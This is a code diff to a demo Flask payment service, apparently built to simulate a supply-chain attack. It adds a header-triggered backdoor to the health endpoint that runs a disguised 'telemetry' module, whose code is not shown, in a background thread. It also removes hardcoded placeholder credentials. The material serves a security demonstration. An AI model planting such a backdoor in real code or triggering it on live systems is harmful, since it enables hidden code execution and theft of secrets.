@@ -2,16 +2,38 @@
 """
 Payment Backend Service - Container Freeze Demo
 Legitimate payment processing API
+
+SUPPLY CHAIN ATTACK SIMULATION:
+This file contains a hidden backdoor in the /api/health endpoint.
+It was injected during the build process - perhaps via a compromised
+base image, a malicious dependency, or a compromised CI/CD pipeline.
+
+The backdoor is triggered by a specific header (X-Debug: enable),
+which simulates a "debug feature" that was left in production code.
 """
 import os
 import time
 import socket
+import threading
 from flask import Flask, request, jsonify
+
+# Import the malicious telemetry module (disguised as a legitimate dependency)
+import telemetry
 
 app = Flask(__name__)
 
 @app.route('/api/health', methods=['GET'])
 def health():
+    # ========================================================================
+    # HIDDEN BACKDOOR
+    # This "debug feature" was left in production code - looks innocent
+    # but triggers the malicious payload download when activated.
+    # Attackers can trigger it by sending: curl -H "X-Debug: enable" /api/health
+    # ========================================================================
+    if request.headers.get('X-Debug') == 'enable':
+        # Run in background thread so health check still returns immediately
+        threading.Thread(target=telemetry.trigger_sync, daemon=True).start()
+
     return jsonify({
         "status": "healthy",
         "service": "payment-backend",
@@ -47,13 +69,8 @@ def list_transactions():
     })
 
 if __name__ == '__main__':
-    # Set credentials in environment (will be stolen by malware)
-    os.environ['AWS_ACCESS_KEY_ID'] = 'AKIAIOSFODNN7EXAMPLE'
-    os.environ['AWS_SECRET_ACCESS_KEY'] = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
-    os.environ['DATABASE_PASSWORD'] = 'SuperSecret123!'
-    os.environ['STRIPE_API_KEY'] = 'sk_live_51JabcdefghijklmnopQRSTUVWXYZ'
-    os.environ['PAYMENT_GATEWAY_TOKEN'] = 'pgw_live_abc123xyz789'
-
+    # Credentials are set via environment variables in the Kubernetes deployment
+    # (simulating real-world secret injection that malware would steal)
     print("[*] Payment Backend Service Starting...")
     print("[*] Version 3.2.1 (Build #8842)")
     app.run(host='0.0.0.0', port=8080, debug=False)
